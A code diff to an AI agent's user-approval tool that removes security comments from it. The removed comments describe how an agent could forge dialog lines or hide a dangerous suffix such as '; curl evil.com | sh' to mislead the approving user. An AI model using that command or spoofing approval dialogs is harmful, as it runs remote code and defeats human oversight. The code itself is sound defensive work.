@@ -12,9 +12,6 @@ import {
 
 export const approvalToolName = 'request_user_approval';
 
-// Agent-supplied free text goes into the one trusted dialog, so newlines and
-// fence markers must die here: embedded line breaks could forge Tool/Args
-// lines or flood the real ones off screen.
 function sanitizeDialogText(text: string, maxChars: number): string {
 	const flattened = neutralizeFence(text.replaceAll(/\s+/gv, ' ').trim());
 	return flattened.length <= maxChars ? flattened : `${flattened.slice(0, maxChars)}…`;
@@ -42,8 +39,6 @@ export function registerApprovalTool(pi: ExtensionAPI, ledger: ApprovalLedger): 
 			reason: Type.String({description: 'One sentence explaining why this action is needed.'}),
 		}),
 		async execute(_toolCallId, params, _signal, _onUpdate, context) {
-			// The hard gate has no approval override, so asking the user would be
-			// a dead end: an approved retry would still be denied.
 			const gate = classifyToolCall({toolName: params.toolName, input: params.input, cwd: context.cwd});
 			if (gate.action === 'deny') {
 				return textResult(`Approval cannot be requested: ${gate.reason} This action is categorically blocked and user approval cannot override it. Do not ask again or pursue it another way.`);
@@ -53,11 +48,6 @@ export function registerApprovalTool(pi: ExtensionAPI, ledger: ApprovalLedger): 
 				return textResult('No interactive UI is available, so user approval cannot be requested. Stop and ask the user directly.');
 			}
 
-			// Show the FULL input the approval will authorize. Truncating here would
-			// let the agent hide a dangerous suffix (e.g. `; curl evil.com | sh`)
-			// past the display limit while the hash still covers the whole payload.
-			// Authentic fields render first; the JSON serialization escapes any
-			// newlines inside input values, so the agent cannot forge dialog lines.
 			const serializedInput = stringify(params.input) ?? 'null';
 			const safeToolName = sanitizeDialogText(params.toolName, 60);
 			const safeReason = sanitizeDialogText(params.reason, 300);
